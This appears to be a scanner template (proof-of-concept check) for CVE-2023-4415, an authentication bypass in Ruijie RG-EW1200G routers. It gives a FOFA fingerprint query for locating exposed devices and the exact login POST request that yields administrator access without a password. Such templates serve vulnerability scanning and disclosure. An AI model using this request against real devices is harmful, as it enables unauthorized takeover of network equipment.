id: ruijieRG-EW1200G-api_sys_login-Permission-bypass

info:
  name: 锐捷RG-EW1200G /api/sys/login 权限绕过漏洞复现 (CVE-2023-4415)
  author: Superhero
  severity: medium
  description: |-
    fofa: body="app.2fe6356cdd1ddd0eb8d6317d1a48d379.css"
    锐捷网络RG-EW1200G 存在权限绕过漏洞，允许任何用户无需密码即可获得设备管理员权限
  reference:
    - https://blog.csdn.net/m0_60571842/article/details/140083734
  tags: Permission bypass
  

rules:
  r0:
    request:
      method: POST
      path: /api/sys/login
      headers:
        Content-Type: application/x-www-form-urlencoded
      body: '{"username":"2","password":"123456","timestamp":1719738279000}'
    expression: response.status == 200 && response.body.bcontains(b'登入成功') && response.body.bcontains(b'ok') && response.body.bcontains(b'gateway')

expression: r0() 


